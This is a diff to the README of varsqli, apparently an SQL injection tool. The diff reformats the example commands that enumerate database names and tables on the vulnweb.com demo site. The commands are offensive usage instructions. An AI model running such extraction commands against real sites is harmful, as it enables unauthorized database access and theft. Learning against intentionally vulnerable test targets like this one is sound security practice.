@@ -49,9 +49,15 @@ options:
   -C CO              Enumerate database to enumerate columns ( ex : --dump-all -T < tables name > -C < columns name >)
 ```
  - after thoroughly learning about the modes, to exploit SQL Injection on a certain SQL database error website, you use this command to extract the database name
- - `$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs`
+
+```
+$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+```
 <img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-10-49-93.jpg">
 <img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-14-14-40.jpg">
 
 - After we have extracted and obtained the name of the database, you use options `--tables -D <database name>` , this is the command, extract all databases  In the tables section, the command:
-- `$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart`
+
+```
+$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart
+```
